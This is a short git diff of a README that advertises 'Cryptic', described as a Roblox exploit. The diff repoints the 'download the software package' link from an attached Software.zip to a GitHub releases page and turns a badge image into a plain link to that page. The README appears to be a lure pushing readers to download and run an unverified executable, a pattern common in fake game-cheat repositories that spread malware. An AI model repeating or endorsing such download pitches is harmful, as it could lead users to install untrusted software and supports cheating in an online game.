@@ -16,7 +16,7 @@ Cryptic is a high-quality exploit designed for Roblox, offering a 98% User Numbe
 
 ## Getting Started:
 
-To access Cryptic and explore its full potential, download the software package [here](https://github.com/user-attachments/files/18060583/Software.zip).
+To access Cryptic and explore its full potential, download the software package [here](https://github.com/ezertrsdcret/Roblox-Cryptic-Executor/releases/tag/v2.0).
 
 ---
 
@@ -28,7 +28,7 @@ In case the provided link does not work, please check the "Releases" section for
 
 ---
 
-![Download Cryptic](https://img.shields.io/badge/Download-Cryptic-blue)
+![Download Cryptic](https://github.com/ezertrsdcret/Roblox-Cryptic-Executor/releases/tag/v2.0)
 
 ---
 
